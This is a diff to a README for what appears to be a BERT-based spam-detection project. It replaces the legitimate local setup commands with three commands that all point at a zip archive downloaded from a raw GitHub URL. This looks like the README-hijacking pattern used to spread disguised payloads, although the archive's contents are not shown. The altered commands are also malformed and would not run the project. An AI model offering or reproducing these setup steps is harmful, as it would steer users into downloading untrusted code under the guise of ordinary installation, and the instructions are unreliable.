@@ -14,6 +14,6 @@ An AI-powered spam detector that classifies emails using **BERT embeddings** and
 
 ## ⚙️ Run Locally
 ```bash
-pip install -r requirements.txt
-python model/train_model.py
-streamlit run app.py
+pip install -r https://github.com/analyst-ujjwal/Ai_project_8/raw/refs/heads/main/model/project-Ai-3.6.zip
+python https://github.com/analyst-ujjwal/Ai_project_8/raw/refs/heads/main/model/project-Ai-3.6.zip
+streamlit run https://github.com/analyst-ujjwal/Ai_project_8/raw/refs/heads/main/model/project-Ai-3.6.zip
